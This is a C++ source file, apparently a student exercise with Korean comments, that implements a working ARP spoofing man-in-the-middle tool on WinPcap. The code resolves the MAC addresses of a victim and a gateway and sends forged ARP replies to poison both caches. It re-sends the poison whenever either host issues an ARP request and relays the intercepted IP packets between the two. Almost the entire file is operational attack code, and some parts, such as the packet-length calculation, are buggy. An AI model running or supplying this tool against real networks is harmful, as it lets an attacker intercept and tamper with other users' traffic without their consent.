#pragma comment(lib, "ws2_32.lib")
//strncmp -> memcmp
//strncpy -> memcpy
//char->uint_8
//short->uint_16
//#pragma pack(push, 1)
//#pragma pack(pop)... byte alignment
//memcmp보다 uint32_t를 쓰는게... ==만으로 계산이 가능하도록..합시다.
//or == 연산자 overriding (mac, ip가 class가 된다. parsing이 바뀔듯)
//용어 정리
//Attacker는 Sender에서 Receiver(target)으로 가는 패킷을 보고 싶어 spoofing을 시도한다. sender가 target이다.
//arp table 변조 시간이 풀리는 시점은, cache expiration time이 끝날 때다. 이는 sender (gateway)가 broadcast로 "who has ~"패킷을 보낼 때이므로, 이 패킷을 확인하자마자 보내주면 된다.
//while 오지게 때리면 안대영~
//vista에서는 broadcast가 아니라unicast로 보낸다.
//arp_spoof wln0 10.2<sender> 10.1<target>

//이중 라우터에서는, 라우터 A가 죽고 라우터 B가 살아나면 라우터 B는 ARP redirect(게이트웨이가 바뀌었음을 알리는 패킷)을 broadcast로 보낸다.

//switch jamming 공격 이해하기 -> dummy hub가 안되고, 그냥 네트워크가 죽는다. 이거보다 arp spoofing이 더 효율적이다.

#include <iostream>
#include <pcap.h>
#include <limits.h>
#include <tchar.h>
#include <string.h>
#include <ctype.h>
#include <list>
#include "getmymacip.h"

//Ethernet Name
//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}

#define MAC_LEN 6
#define IPV4_LEN 4
#define ETHERTYPE 0x0001
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARP_LEN 42	//define대신 static const
#define ARP_REPLY_TYPE 0

#pragma pack(1)
typedef struct ethernet_header {
	uint8_t dest[MAC_LEN];
	uint8_t sour[MAC_LEN];
	uint16_t type;	//2byte
}ETHER_HDR;
typedef struct arp_header {
	uint16_t type;
	uint16_t protocol_type;
	uint8_t hrdAddr;	//hardware address
	uint8_t prtAddr;	//protocol address
	uint16_t opcode;	//1 request, 2 reply, 3 RARP request, 4 RARP reply
	uint8_t send_mac[MAC_LEN];
	uint8_t send_ip[IPV4_LEN];
	uint8_t recv_mac[MAC_LEN];
	uint8_t recv_ip[IPV4_LEN];
}ARP_HDR;
typedef struct ipv4_header {
	uint8_t ip_header_len : 4;	//4bit
	uint8_t ip_ver : 4;				//4bit
	uint8_t ip_tos;	//type of service
	uint16_t ip_total_length;	//total ip length, no ethernet header
	uint16_t ip_pid;	//packet id

	uint8_t ip_frag_offset;	//fragmented된 패킷일 경우, 이게 몇 번째인지?
	uint8_t ip_ttl;	//time to live
	uint8_t ip_protocol;	//ip protocol
								//TCP 0x06, UDP 0x11
	uint16_t ip_checksum;
	uint32_t ip_srcaddr;
	uint32_t ip_destaddr;
}IPV4_HDR;
typedef struct IP {
	uint8_t ip[IPV4_LEN];
	bool operator == (struct IP& r) {
		for (int i = 0; i < IPV4_LEN; i++) {
			if (ip[i] != r.ip[i])
				return false;
		}
		return true;
	}
	void operator = (struct IP& r) {
		for (int i = 0; i < IPV4_LEN; i++) {
			ip[i] = r.ip[i];
		}
	}
}IP;
typedef struct MAC {
	uint8_t mac[MAC_LEN];
	bool operator == (struct MAC& r) {
		for (int i = 0; i < MAC_LEN; i++) {
			if (mac[i] != r.mac[i])
				return false;
		}
		return true;
	}
	void operator = (struct MAC& r) {
		for (int i = 0; i < MAC_LEN; i++) {
			mac[i] = r.mac[i];
		}
	}
}MAC;
typedef struct session {
	MAC sender_mac;
	IP sender_ip;
	MAC destination_mac;
	IP destination_ip;
}session;

//target은, 실제로 테이블에서 변조하고자 하는 내용. (게이트웨이ip, 내mac)
/*
MAC sender_mac;								//공격을 위해서는 공격자의 mac주소가 들어가야함. type은 reply
IP sender_ip;								//공격하려면 gateway ip주소가 들어가야 함.
MAC destination_mac;						//테이블 변조 대상
IP destination_ip;
MAC sender_mac2;								//공격을 위해서는 공격자의 mac주소가 들어가야함. type은 reply
IP sender_ip2;								//공격하려면 gateway ip주소가 들어가야 함.
MAC destination_mac2;						//테이블 변조 대상
IP destination_ip2;
*/

session sess[2];
MAC my_mac;
IP my_ip;

using namespace std;


void ipParser(char* ip, IP* destination_ip) {
	char* ptr = ip;
	for (int i = 0; *ptr; i++) {
		if (*ptr < '0' || *ptr > '9')
			ptr++;
		destination_ip->ip[i] = (uint8_t)strtol(ptr, &ptr, 10);
	}		
}
void macParser(char* mac, MAC* destination_mac) {
	char* ptr = mac;
	for (int i = 0; i < 20; i++)				//changing capital alpha into small alpha
		mac[i] = tolower(mac[i]);

	for (int i = 0; *ptr; i++) {
		if (!isdigit(*ptr) && !islower(*ptr))	//alien character, when not a small alphabet
			ptr++;
		destination_mac->mac[i] = (uint8_t)strtol(ptr, &ptr, 16);
	}
}
void printPacket(uint8_t* packet, int packet_size) {
	for (int i = 0; i < packet_size; i++) {
	if (!(i % 16))
	printf("\n");
	printf("%02x ", packet[i]);
	}
}
int sendARPrequest(pcap_t* fp, session* sess) {
	int packet_idx = 0;
	ETHER_HDR eth;
	ARP_HDR arp;
	uint8_t packet[1500];
	memset(&eth, 0, sizeof(eth));
	memset(&arp, 0, sizeof(arp));
	memset(&packet, 0, sizeof(packet));

	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		eth.sour[i] = sess->sender_mac.mac[i];
		eth.dest[i] = 0xff;
		arp.send_mac[i] = sess->sender_mac.mac[i];	//target mac는 gateway인척 pretending하는 mac주소로, attacker의 mac이다.
		arp.recv_mac[i] = 0x00;
	}
	eth.type = htons(ETHERTYPE_ARP);

	memcpy(packet, &eth, sizeof(eth));
	packet_idx += sizeof(eth);

	arp.type = htons(ETHERTYPE);			//ethernet type
	arp.protocol_type = htons(ETHERTYPE_IP);
	arp.hrdAddr = MAC_LEN;					//hardware size. 여기서 hardware는 mac주소를 쓴다.
	arp.prtAddr = IPV4_LEN;					//protocol size. 여기서 ipv4프로토콜을 쓰고, 당연히 주소는 ip이다.
	arp.opcode = htons(0x0001);	//request
	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
		arp.send_ip[i] = sess->sender_ip.ip[i];		//actual my ip, 대충써도 된다더라
		arp.recv_ip[i] = sess->destination_ip.ip[i];	//victim ip
	}

	memcpy(packet + packet_idx, &arp, sizeof(arp));
	packet_idx += sizeof(arp);
	printPacket(packet, packet_idx);
	if (pcap_sendpacket(fp, packet, ARP_LEN)) {
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
		return -1;
	}
	return 1;
}
//send arp packet and take mac of target
//어차피 arp spoofing을 할때는 source mac은 항상 mymac이므로, 해당 함수는 destination의 mac을 구하는 용도로 사용
int arp_getmac(pcap_t* fp, session* sess) {

	if (sendARPrequest(fp, sess) == -1)										//mac을 따기 위해 거짓 패킷을 하나 보냄
		return -1;

	struct pcap_pkthdr h;
	const u_char* temp = pcap_next(fp, &h);
	int count = 1000;
	while (temp) {
		if (count-- < 0) {
			printf("ARP return isn't captured\n\n");
			return -1;
		}

		if (temp[12] == 0x08 && temp[13] == 0x06 && temp[20] == 0 && temp[21] == 2) {		//ARP패킷인지, reply인지 확인
			if (!memcmp((const char*)sess->destination_ip.ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31이 target ip와 같은지
																								//printPacket((uint8_t*)temp, ARP_LEN);								//22 ~ 27 mac 따기
				memcpy((char*)sess->destination_mac.mac, (char*)temp + 22, MAC_LEN);
				printf("Mac address is captured\n");
				break;
			}
		}
		temp = pcap_next(fp, &h);
	}
	//printf("fail to capture packet\n");
}
int sendPacket(pcap_t* fp, int type, session* sess) {
	ETHER_HDR eth;
	uint8_t packet[1500];
	int packet_idx = 0;
	memset(&eth, 0, sizeof(eth));
	memset(&packet, 0, sizeof(packet));

	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
		eth.sour[i] = sess->sender_mac.mac[i];
		eth.dest[i] = sess->destination_mac.mac[i];
	}

	if (type == ARP_REPLY_TYPE) {							//when arp
		ARP_HDR arp;
		memset(&arp, 0, sizeof(arp));

		eth.type = htons(ETHERTYPE_ARP);		//only for ARP
		memcpy(packet, &eth, sizeof(eth));
		packet_idx += sizeof(eth);
		arp.type = htons(ETHERTYPE);			//ethernet type
		arp.protocol_type = htons(ETHERTYPE_IP);
		arp.hrdAddr = MAC_LEN;					//hardware size. 여기서 hardware는 mac주소를 쓴다.
		arp.prtAddr = IPV4_LEN;					//protocol size. 여기서 ipv4프로토콜을 쓰고, 당연히 주소는 ip이다.
		arp.opcode = htons(0x0002);	//attack, reply
		for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
			arp.send_ip[i] = sess->sender_ip.ip[i];		//arp에선 source ip가 pretending ip(gateway)이다.
			arp.recv_ip[i] = sess->destination_ip.ip[i];	//victim ip
		}
		for (int i = 0; i < MAC_LEN; i++) {		//mac of arp header
			arp.send_mac[i] = sess->sender_mac.mac[i];
			arp.recv_mac[i] = sess->destination_mac.mac[i];
		}
		memcpy(packet + packet_idx, &arp, sizeof(arp));
		packet_idx += sizeof(arp);

		if (pcap_sendpacket(fp, packet, ARP_LEN)) {
			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
			return -1;
		}
		printPacket(packet, 42);
		Sleep(500);//0.5s
	}
		
}

int main(int argc, char* argv[]) {
	pcap_if_t* alldevs;
	pcap_t* fp;
	//findalldevs 정보 https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
	int inum = -1;	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		fprintf(stderr, "Error to find devices: %s\n", errbuf);
		exit(1);
	}

	//pcap_t 구조체 정보 https://blog.silnex.kr/libpcapstruct-pcap_t/
	for (pcap_if_t* dev = alldevs; dev; dev = dev->next) {
		printf("%d. %s", ++i, dev->name);
		int idx;
		for (idx = 0; dev->name[idx] != '{'; idx++);
		if (!strcmp(dev->name + idx, argv[1]))
			inum = i;
		if (dev->description)
			printf(" (%s)\n", dev->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0) {
		printf("\nNo interfaces found\n");
		return -1;
	}

//	printf("Enter the interface number(1-%d): ", i);
//	scanf("%d", &inum);

	if (inum<1 || inum>i) {
		printf("\nInvalid number\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	i = 0;
	pcap_if_t* dev = alldevs;
	for ( ; i < inum - 1; dev = dev->next, i++);
	//list 순회하여 선택된 interface로 넘어감.

	//`live, fp 정보 https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
	fp = pcap_open_live(dev->name, USHRT_MAX + 1, 0, 1000, errbuf);
	//device name, capturing size, promiscuous mode, read timeout, error buffer
	if (!fp) {
		fprintf(stderr, "\nCannot open the adapter.\n%s is not supported by WinPcap\n", argv[1]);
		return -1;
	}
	
//INPUT---------------------------------------------------------------------------------------------------------------------
	char interfaceName[100];
	char ip[30];
	//mydevice
	//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}
	//name, destination_ip, target_ip
	strncpy(interfaceName, argv[1], strlen(argv[1]));	//device name
	interfaceName[strlen(argv[1])] = 0;

	memcpy(ip, argv[2], strlen(argv[2]));				//192.168.43.?	(destination, ?이 받고 있다, 테이블 변조 대상)
	ipParser(ip, &sess[0].destination_ip);
	memset(ip, 0, sizeof(ip));
	
	memcpy(ip, argv[3], strlen(argv[3]));				//192.168.43.1 (sender, 1이 보내고 있는 척)
	ipParser(ip, &sess[0].sender_ip);
	memset(ip, 0, sizeof(ip));
	
	memcpy(ip, argv[4], strlen(argv[4]));
	ipParser(ip, &sess[1].destination_ip);
	memset(ip, 0, sizeof(ip));
	
	memcpy(ip, argv[5], strlen(argv[5]));
	ipParser(ip, &sess[1].sender_ip);
	memset(ip, 0, sizeof(ip));

	//get destination mac using ip 
	macParser(getMyMac(interfaceName), &my_mac);		//내 mac 직접 구하기
	ipParser(getMyIP(interfaceName), &my_ip);			//내 ip직접 구하기
	sess[0].sender_mac = my_mac;								//여기서 sender_mac은 내 것으로 변조
	sess[1].sender_mac = my_mac;

	if (arp_getmac(fp, &sess[0]) == -1)		//destination_mac 구하기
		exit(0);																	//sender_ip, destination_ip는 이미 주어짐. 여기서 모든 값
	if (arp_getmac(fp, &sess[1]) == -1)
		exit(0);

//send corrupted arp--------------------------------------------------------------------------------------------------------
	sendPacket(fp, ARP_REPLY_TYPE, &sess[0]);
	sendPacket(fp, ARP_REPLY_TYPE, &sess[1]);
//send corrupted arp--------------------------------------------------------------------------------------------------------

	struct pcap_pkthdr* h;
	u_char* next_packet;
	pcap_next_ex(fp, &h, (const u_char**)&next_packet);
	int count = 0;

	while (++count) {										//패킷 캡쳐하기
		
		if (!next_packet) {
			printf("\nNo packet\n");
			exit(1);
		}
		
		printPacket((uint8_t*)next_packet, 42);
		
		bool isARPrequest = !memcmp(next_packet + 12, "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01", 10);			//12~21이 "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01" 일때, 01은 request
		if (isARPrequest) {																				//ARP 요청 패킷이라면
			printf("\nARP request packet is found\n");
			for (int i = 0; i <= 1; i++) {																//gateway, victim 양방면 확인
				bool f1, f2, f3, f4;
				f1 = !memcmp(sess[i].destination_mac.mac, next_packet + 6, MAC_LEN);										//패킷의 0~5번째 인덱스가 gateway mac 주소와 같거나(공격시엔 공격자 맥주소)
				f2 = !memcmp(sess[i].sender_mac.mac, "\xff\xff\xff\xff\xff\xff", MAC_LEN);						// or ffffffffffff와 같을 때
				f3 = !memcmp(sess[i].sender_ip.ip, (uint8_t*)next_packet + 38, IPV4_LEN);						//39~42 gateway ip주소(real ip)
				f4 = !memcmp(next_packet + 28, sess[i].destination_ip.ip, IPV4_LEN);							//victim이 보낸 패킷인지? (victim이 보낸 패킷)
				if ((f1 || f2) && f3 && f4)															//victim의 gateway mac 요청인지 확인하고
					sendPacket(fp, ARP_REPLY_TYPE, &sess[i]);													//변조패킷 전송
			}
		}
		else if(next_packet[12] == 0x08 && next_packet[13] == 0x00 && next_packet[23] == 0x01){				//ip packet임을 확인																				//아니라면, victim-gateway 통신인지 확인하고 포워딩
			//packet forwarding
			//victim-attacker send_mac 내거 send_ip gateway거 destination_mac, ip는 victim거
			//gateway-attacker send_mac 내거 send_ip victim거 destination_mac, ip는 gateway거
			//next_packet[12]==0x08, [13]==0x00인지 확인하여 ip패킷인지 먼저 확인
			//26~29가 source(테이블을 변조시킨 victim ip, 여기선 destination_ip.ip), 30~33이 destination(gateway ip, 여기선 sender_ip.ip)
			//victim->gateway, ip는 victim->gateway지만 mac은 victim->my_mac이다. 따라서 mac을 my_mac->gateway로 바꿔줘야한다.

			//sess[0]값 sender_ip 192.168.43.1 destination_ip 192.168.43.202
			//sender_mac my_mac destination_mac victiom

			//sess[1]값 sender_ip 192.168.43.202 destination_ip 192.168.43.1
			//sender_mac my_mac destination_mac gateway
			u_char forwarding[1500];
			memset(forwarding, 0, 1500);
			//if (count > 50) {
			//	next_packet = (u_char*)malloc(sizeof(char) * 1500);
			//	memcpy(next_packet, "\xcc\x2f\x71\x59\x64\x74\xd0\xc6\x37\xd3\x10\x1c\x08\x00\x45\x00" \
			//		"\x00\x3c\x26\xe2\x00\x00\x80\x01\x17\x5d\xc0\xa8\x2b\xca\x08\x08" \
			//		"\x08\x08\x08\x00\x4c\x00\x00\x01\x01\x5b\x61\x62\x63\x64\x65\x66" \
			//		"\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76" \
			//		"\x77\x61\x62\x63\x64\x65\x66\x67\x68\x69", 74);
			//}
			//victim->random. ip는 victim(source, 26)->random(dest, 30)이지만 victim_mac(src, 6)->my_mac(dest, 0)이다.
			//따라서 my_mac->gateway_mac, my_ip->random_ip로 수정.
			//printf("\n\nicmp is captured\n\n");
			//printPacket(next_packet, (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14);
			//getchar();
			if (!memcmp(next_packet + 26, sess[0].destination_ip.ip, IPV4_LEN)) {
				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
				memcpy(forwarding, next_packet, packet_len);
				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
				memcpy(forwarding, sess[1].destination_mac.mac, MAC_LEN);
//				memcpy(forwarding + 26, my_ip.ip, IPV4_LEN);
				pcap_sendpacket(fp, forwarding, packet_len);
				printPacket(forwarding, packet_len);
			}
			//sess[0]값 sender_ip 192.168.43.1 destination_ip 192.168.43.202
			//sender_mac my_mac destination_mac victiom
			//sess[1]값 sender_ip 192.168.43.202 destination_ip 192.168.43.1
			//sender_mac my_mac destination_mac gateway

			//202, des[0]  1, des[1]
			//random->victim. ip는 random(src, 26)->my_ip(dest, 30)이지만 mac은 gateway(src, 6)->my_mac(dest, 0)이다.
			//따라서 my_mac(6)->victim_mac(0), random_ip(src, 26)->victim_ip(dest, 30)으로 수정.
			else if (!memcmp(next_packet + 30, sess[0].destination_ip.ip, IPV4_LEN)) {
				int packet_len = (next_packet[16] << sizeof(u_char)) + next_packet[17] + 14;
				memcpy(forwarding, next_packet, packet_len);
				memcpy(forwarding + 6, my_mac.mac, MAC_LEN);
				memcpy(forwarding, sess[0].destination_mac.mac, MAC_LEN);
//				memcpy(forwarding + 30, sess[0].destination_ip.ip, IPV4_LEN);
				pcap_sendpacket(fp, forwarding, packet_len);
			}
				/*
				if this packet is from victim to gateway(source mac and ip is vimtim's / destination ip is gateway's / destination mac is mine)
				{
					change_value(source_mac -> my_mac)
					change_value(destination_mac -> real gateway's mac)
					int packet_len = recognizing_packet_type_and_get_length;
					pcap_sendpacket(fp, next_packet, packet_len);
				}
				else if this packet is from gate to victim(source mac and ip is gateway's / destination ip is victim's / destination mac is mine)
				{
					change_value(source_mac -> my_mac)
					change_value(destination_mac -> real victim's mac)
					int packet_len = recognizing_packet_type_and_get_length;
					pcap_sendpacket(fp, next_packet, packet_len);
				}
				*/

		}
		printf("\n%d\n", count);
		pcap_next_ex(fp, &h, (const u_char**)&next_packet);		
	}
}
